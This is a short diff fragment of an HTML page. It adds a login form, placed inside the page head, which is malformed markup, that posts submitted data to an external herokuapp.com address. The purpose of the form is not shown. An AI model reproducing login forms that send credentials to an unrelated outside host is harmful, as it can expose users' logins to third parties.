@@ -2,6 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+	<form class="login_form" action="https://nurtenir.herokuapp.com/" method="post" name="form" onsubmit="return validated()">
 <style>
 /* Style all input fields */
 input {
